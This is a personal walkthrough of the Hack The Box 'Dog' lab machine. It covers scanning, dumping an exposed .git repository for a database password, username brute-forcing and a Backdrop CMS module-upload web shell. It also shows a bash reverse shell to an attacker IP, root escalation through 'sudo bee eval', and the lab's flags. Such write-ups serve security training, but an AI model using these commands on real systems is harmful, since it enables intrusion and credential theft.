## WALKTHROUGH DOG machine

ip ```10.129.231.223```

Step 1: scanning the host

```bash
nmap -Pn -sV -p- -T4 10.129.231.223 -oG nmap_res.txt
```
```
*output*
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```
```
*question*
How many open TCP ports are listening on Dog?

*answer*
2
explanation: 22 & 80

```

step 2:  brute-force web directories using feroxbuster

```bash
feroxbuster -u http://10.129.186.26/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50 --extensions xml,php,txt -r

# -u --> url of host
# -w --> wordlist
# -t --> amount of threads 
# --extensions --> what spesific files to search
# -r --> if found directory --> does recursive search inside it

**
or 
**

gobuster dir -u http://10.129.185.168 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 

```
```
QUESTION: What is the name of the directory on the root of the webserver that leaks the full source code of the application?

ANSWER: .git

EXPLANATION: The /.git/ directory is automatically created by Git when someone initializes a Git repository (via git init) in a project folder. It contains all the metadata, history, branches, and commits of the project. Think of it as the brain of the Git repository.


```

Step 3: Visiting the site and getting info

```bash
sudo nano /etc/hosts # add the $IP to visit the website
#very common in ctf and HTB
```
```
*steps*
visit the site with the url http://10.129.186.26/
look at bottom of the page for the CMS
CMS = content-management-system
manages the website *example: wordpress, Backdrop CMS*

```
```
*question*
What is the CMS used to make the website on Dog? Include a space between two words.

*answer*
Backdrop CMS

```

Step 4: Going through the .git database

```bash
git clone https://github.com/internetwache/GitTools.git  ##usefull tools to scan git repositories in web applications
cd Dumper ##Tool to download git reposiroy to our pc
bash gitdumper.sh http://10.129.185.168/.git/ ~/HTB/DOG #This is the script

##Will takes couple of minutes

#After completion
git checkout -f #inside created directory

#look for password
#hint: settings file --> open in geany

```
```
*steps*
download git tools
run Dumper on url
convert binary to text git directory using git checkout
using text mamipulation and logical scanning find the password
password is found in settings.php in the line:
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'; 

```
```
*question*
What is the password the application uses to connect to the database?

*answer*
BackDropJ2024DS2024

```

Step 5: Finding the admin user of Backdrop CMS 

```bash
hydra -L /home/kali/Desktop/Main/rockyou.txt
-p 'BackDropJ2024DS2024' #password we found earlier 
-V #Verbose - show all tries
-u dog.htb #url
http-post-form #type of attack , we chanhe the pose request each time with the credintials
"/?q=user/login:name=^USER^&pass=BackDropJ2024DS2024&form_id=user_login&op=Log+in:Sorry, unrecognized username."
# is response is diffrent from this respone (response for wrong username and password) then print the USERNAME 

#HINT TOLD US TO CHECK ?q=accounts/
#We understand that when we insert valid user the output will change
#Lets try to brute force USERNAME using ffuf
ffuf -u http://10.129.185.168/\?q=accounts/FUZZ -w /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -v
#check output of fuzz command below
#we got the users: john,tiffany, morris, axel
#lets try to connect via ?q=username/login for every user & password we found in earlier question

```
```another aproach```

i used to main approches to find the user name: using burpuite for bruteforce & using grep the same way i found the password earlier

```burp aproach```
1. go to the login page located at : http://10.129.231.223/?q=user/login
2. try random user and use the password *~BackDropJ2024DS2024~*
3. cupture the POST request via burp and send it to intruder
4. use the *`/usr/share/wordlists/SecLists/Usernames/Names/names.txt`*
5. run the attack and filter by size --> the unusuall size is the answer 
 
```grep aproach```
1. used the command below to locate mail releted to HTB

`grep -iRE ".*@.*htb" /home/kali/HTB/DOG/GitTools/Dumper/GIT_OUTPUT/`
inside 

i found the mail: "tiffany@dog.htb"
2. lets try to find more users-->
`grep -iRE ".*@dog.htb" /home/kali/HTB/DOG/GitTools/Dumper/GIT_OUTPUT/`

found another user --> `dog@dog.htb`
```
```
we get valid response :
[Status: 403, Size: 7635, Words: 643, Lines: 114, Duration: 584ms]
| URL | http://10.129.185.168/?q=accounts/john
    * FUZZ: john

[Status: 403, Size: 7635, Words: 643, Lines: 114, Duration: 98ms]
| URL | http://10.129.185.168/?q=accounts/tiffany
    * FUZZ: tiffany

[Status: 403, Size: 7635, Words: 643, Lines: 114, Duration: 132ms]
| URL | http://10.129.185.168/?q=accounts/morris
    * FUZZ: morris

[Status: 403, Size: 7635, Words: 643, Lines: 114, Duration: 281ms]
| URL | http://10.129.185.168/?q=accounts/axel
    * FUZZ: axel



```
*question*
What user uses the DB password to log into the admin functionality of Backdrop CMS?

*answer*
tiffany
```
Step 6: exploiting the service & getting a shell
```bash

```


*steps*
1. log into the web site with the found credentials:

`username: tiffany , password: BackDropJ2024DS2024`

2. after broswing the websiter i noticed there is a file upload option
3.go to "*install new modules*" --> *"manual installation"*
4. search in searchsploit for Backdrop 1.27

this veersion has file upload vulnerability
we will upload a reverse php file and try to gain a shell
5. run the exploit python 52021.py 10.129.231.223
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
6. after funning the exploit notice it created shell directory and shell.zip

┌──(kali㉿kali)-[~/HTB/DOG]
└─$ ls
52021.py  answers.md  GitTools  nmap_res.txt  shell  shell.zip

the problem is the website only allows tar.gz files to be uploaded
so lets convert our shell directory to shell.tar.gz using `tar ` tool

`tar -czvf shell.tar.gz shell `  
| Flag | Meaning                                            |
| ---- | -------------------------------------------------- |
| `c`  | Create a new archive                               |
| `z`  | Compress with gzip                                 |
| `f`  | File archive name follows (i.e., `archive.tar.gz`) |
| `v`  | Verbose — list files as they're added              |


7. now upload the final shell.tar.gz file to the website 
8. after upload is success go to 

    *http://10.129.231.223/modules/shell/shell.php*
    
    you shuld be able to run commands
    if not working check you added dog.htb to --> /etc/hosts


```
*question*
What system user is the Backdrop CMS instance running as on Dog?
*answer*
```


Step 7: exploiting the service & getting a shell
```bash
bash -c "bash -i >& /dev/tcp/10.10.14.119/1337 0>&1" --> paste on website
#on local pc(attacker machine)
 nc -lnvp 1337     
```

```
*steps*
```
* we know from the question another user has the same password
1. get a shell
2. go to /home directory to check users
3. try su $user for every user until it works

```
*question*
What system user on Dog shares the same DB password?
*answer*
johncusack
```


## USER FLAG
```
*question*
Submit the flag located in the johncusack user's home directory.
*answer*
3744a28dd7a125f4328473c214720c0e


stpes:
1. go to /home/johncusack/
2. cat the user.txt
```

## Privilage Esculation

```
*question - task 9*
Submit the flag located in the johncusack user's home directory.
*answer*
/usr/local/bin/bee
```
stpes:
1. sudo -Sl

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```


```
*question - task 10*
bee requires a root directory to run properly. What is the appropriate root directory on Dog? Include the trailing /.

*answer*
after a short google search i found that bee is cli utility for using backdrop CMS.
The root directory of the website contaions settings.php file

lets find this file and figure out the root directory
```
stpes:
1. find / | grep settings.php

found inside --> `/var/www/html`

```

```
*question - task 11*
What is the bee subcommand to run arbitrary PHP code?

*answer*
eval
```
stpes:
1. run the command below inside root directory: `/var/www/html` 

    sudo /usr/local/bin/bee --root
2. check out all avalibale commands with:

    sudo /usr/local/bin/bee help -->
    ```
    eval
    ev, php-eval
    Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
    ```





## ROOT FLAG

1. after gaining options to run commands as root simply enter the root directory to find the root.txt flag

`sudo /usr/local/bin/bee eval "system('cd /root/ ;cat root.txt');"
` 
`FLAG: e346077852350e09fd1ce91c8509f6a3`



```
*output* (of gobuster command)
/.git                 (Status: 301) [Size: 313] [--> http://10.129.186.26/.git/]
/.git/HEAD            (Status: 200) [Size: 23]
/.git/config          (Status: 200) [Size: 92]
/.git/logs/           (Status: 200) [Size: 1132]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.git/index           (Status: 200) [Size: 344667]
/core                 (Status: 301) [Size: 313] [--> http://10.129.186.26/core/]
/files                (Status: 301) [Size: 314] [--> http://10.129.186.26/files/]
/index.php            (Status: 200) [Size: 13368]
/layouts              (Status: 301) [Size: 316] [--> http://10.129.186.26/layouts/]
/modules              (Status: 301) [Size: 316] [--> http://10.129.186.26/modules/]
/robots.txt           (Status: 200) [Size: 1198]
/server-status        (Status: 403) [Size: 278]
/sites                (Status: 301) [Size: 314] [--> http://10.129.186.26/sites/]
/themes               (Status: 301) [Size: 315] [--> http://10.129.186.26/themes/]
```
```
*question*
What is the name of the directory on the root of the webserver that leaks the full source code of the application?

*answer*
.git
.git is know directory in web application to save all source code --> via goggle search

```




```
nmap -p 22,80 -sV -sC 10.129.186.26    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 03:53 EDT
Nmap scan report for 10.129.186.26
Host is up (0.071s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | Dog
| http-git: 
|   10.129.186.26:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.65 seconds


```